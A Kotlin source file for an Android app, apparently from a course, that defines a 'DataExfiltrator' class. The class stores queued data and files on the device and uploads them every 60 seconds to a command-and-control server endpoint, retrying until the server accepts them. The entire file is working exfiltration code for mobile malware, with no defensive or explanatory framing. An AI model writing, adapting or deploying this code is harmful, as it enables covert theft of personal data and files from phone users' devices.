package com.example.inf2215

import android.content.Context
import android.util.Log
import kotlinx.coroutines.*
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

class DataExfiltrator(private val context: Context) {

    private val c2Base = "http://10.0.2.2:5000/upload" // adjust if needed
    private val pendingDataFile = File(context.filesDir, "pending_data.txt")
    private val pendingFilesDir = File(context.filesDir, "pending_files").apply { mkdirs() }

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var isRunning = true

    init {
        // Restore any previously unsent data from disk
        restorePendingData()
        restorePendingFiles()
        startExfilLoop()
    }

    // ------------------ Public API ------------------
    fun queueData(data: String) {
        // Append to persistent file
        synchronized(this) {
            pendingDataFile.appendText("$data\n")
        }
    }

    fun queueFile(file: File) {
        // Move file to pending directory (atomic rename)
        val dest = File(pendingFilesDir, file.name)
        if (file.renameTo(dest)) {
            // success
        } else {
            Log.e("DataExfiltrator", "Failed to move file to pending: ${file.name}")
        }
    }

    // ------------------ Restoration ------------------
    private fun restorePendingData() {
        if (!pendingDataFile.exists()) return
        // Nothing to do in memory – we'll read line by line during exfil loop
        // The file already contains all pending data.
    }

    private fun restorePendingFiles() {
        // Files are already in pendingFilesDir, ready to be sent.
    }

    // ------------------ Exfiltration Loop ------------------
    private fun startExfilLoop() {
        scope.launch {
            while (isRunning) {
                sendPendingData()
                sendPendingFiles()
                delay(60000) // 60 seconds
            }
        }
    }

    private fun sendPendingData() {
        if (!pendingDataFile.exists()) return
        val lines = mutableListOf<String>()
        val unsentLines = mutableListOf<String>()

        // Read all lines and try to send each
        synchronized(this) {
            try {
                pendingDataFile.readLines().forEach { line ->
                    if (line.isNotBlank()) {
                        if (sendData(line)) {
                            // success, do not add to unsentLines
                        } else {
                            unsentLines.add(line)
                        }
                    }
                }
                // Rewrite file with only unsent lines
                if (unsentLines.isEmpty()) {
                    pendingDataFile.delete()
                } else {
                    pendingDataFile.writeText(unsentLines.joinToString("\n") + "\n")
                }
            } catch (e: Exception) {
                Log.e("DataExfiltrator", "Error processing pending data", e)
            }
        }
    }

    private fun sendPendingFiles() {
        val files = pendingFilesDir.listFiles() ?: return
        files.forEach { file ->
            if (sendFile(file)) {
                file.delete()
            }
        }
    }

    // ------------------ Actual Network Senders ------------------
    private fun sendData(data: String): Boolean {
        return try {
            val url = URL("$c2Base/data")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "text/plain")
            conn.outputStream.use { it.write(data.toByteArray()) }
            val success = conn.responseCode == HttpURLConnection.HTTP_OK
            conn.disconnect()
            success
        } catch (e: Exception) {
            Log.e("DataExfiltrator", "sendData failed: ${e.message}")
            false
        }
    }

    private fun sendFile(file: File): Boolean {
        return try {
            val url = URL("$c2Base/file")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/octet-stream")
            conn.setRequestProperty("X-Filename", file.name)
            conn.outputStream.use { output ->
                FileInputStream(file).use { input -> input.copyTo(output) }
            }
            val success = conn.responseCode == HttpURLConnection.HTTP_OK
            conn.disconnect()
            success
        } catch (e: Exception) {
            Log.e("DataExfiltrator", "sendFile failed: ${e.message}")
            false
        }
    }

    fun shutdown() {
        isRunning = false
        scope.cancel()
    }
}